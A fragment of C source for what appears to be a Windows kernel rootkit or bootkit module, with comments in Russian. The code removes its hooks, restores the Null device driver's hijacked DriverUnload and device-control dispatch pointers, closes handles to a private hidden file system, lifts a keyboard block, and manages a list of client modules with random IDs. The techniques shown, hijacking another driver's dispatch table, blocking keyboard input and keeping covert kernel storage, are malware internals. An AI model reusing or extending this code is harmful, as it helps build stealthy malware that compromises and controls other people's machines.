void userio_shutdown_routine()
{
    uint32_t i;
    uint32_t size;
    USE_GLOBAL_BLOCK

    // Снимаех хуки.
    pGlobalBlock->pCommonBlock->fndissasm_uninstall_hook(pGlobalBlock->pUserioBlock->pNullUnloadHook);

    // Восстанавливаем всё что попортили.
    pGlobalBlock->pUserioBlock->pNullDevObject->DriverObject->DriverUnload = pGlobalBlock->pUserioBlock->pNullDriverUnload;
    pGlobalBlock->pUserioBlock->pNullDevObject->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)pGlobalBlock->pUserioBlock->pNullDriverDevIo;

    // Закрываем все открытые хэндлы (ничего не поделаешь).
    size = (uint32_t)pGlobalBlock->pUserioBlock->pHandles[0];
    for (i = 1; i < size; ++i) {
        pzfs_file_t pFile;

        pFile = (pzfs_file_t)pGlobalBlock->pUserioBlock->pHandles[i];
        if (pFile != NULL) {
            FN_zfs_close(pFile);
        }
    }

    // Снимаем блок с клавиаутры.
    pGlobalBlock->pUserioBlock->keyboardBlocked = 0;
    pGlobalBlock->pUserioBlock->fnuserio_keyboard_hook_internal(0);

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pUserioBlock->pHandles, LOADER_TAG);
    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pUserioBlock, LOADER_TAG);
}

pclient_entry_t userio_add_client(char* clientModule)
{
    pclient_entry_t pHead, pEntry;
    USE_GLOBAL_BLOCK

    pHead = &pGlobalBlock->pUserioBlock->clientsHead;
    pEntry = (pclient_entry_t)pHead->Flink;

    // Ищем запись о клиенте среди уже созданных.
    while (pEntry != pHead) {
        if (MEMCMP(pEntry->clientModulePath, clientModule, 4 * ZFS_MAX_FILENAME)) {
            break;
        }

        pEntry = (pclient_entry_t)pEntry->Flink;
    }

    if (pEntry == pHead) {
        int i, len, counter = 0;
        phavege_state_t pHS;
        // Создаём новую запись.
        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pEntry, sizeof(client_entry_t), NonPagedPool);

        // Генерируем уникальный client ID.
        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pHS, sizeof(havege_state_t), NonPagedPool);
        pGlobalBlock->pCommonBlock->fnhavege_init(pHS);
        pGlobalBlock->pCommonBlock->fnhavege_rand(pHS, pEntry->clientId, sizeof(pEntry->clientId));
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pHS, LOADER_TAG);

        len = pGlobalBlock->pCommonBlock->fnstrlen(clientModule);
        __movsb(pEntry->clientModulePath, clientModule, len);

        for (i = 0; i < len; ++i) {
            if (clientModule[i] == '\\') {
                ++counter;
            }

            if (counter == 3) {
                __movsb(pEntry->clientPath, clientModule, i);
                pEntry->clientPathLen = i;
                break;
            }
        }
        pEntry->refCount = 1;

        pGlobalBlock->pCommonBlock->fncommon_insert_tail_list((PLIST_ENTRY)pHead, (PLIST_ENTRY)pEntry);
    }
    else {
        ++pEntry->refCount;
    }

    return pEntry;
}

void userio_remove_client(char* clientModule)
{
    int len;
    pclient_entry_t pHead, pEntry;
    USE_GLOBAL_BLOCK

    pHead = &pGlobalBlock->pUserioBlock->clientsHead;
    pEntry = (pclient_entry_t)pHead->Flink;

    len = pGlobalBlock->pCommonBlock->fnstrlen(clientModule);
    // Ищем запись о клиенте среди уже созданных.
    while (pEntry != pHead) {
        if (MEMCMP(pEntry->clientModulePath, clientModule, len)) {
            if ((--pEntry->refCount) <= 0) {
                pclient_entry_t pTemp = (pclient_entry_t)pEntry->Blink;
                pGlobalBlock->pCommonBlock->fncommon_remove_entry_list((PLIST_ENTRY)pEntry);
                pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pEntry, LOADER_TAG);
                pEntry = pTemp;
            }
        }

        pEntry = (pclient_entry_t)pEntry->Flink;
    }
}
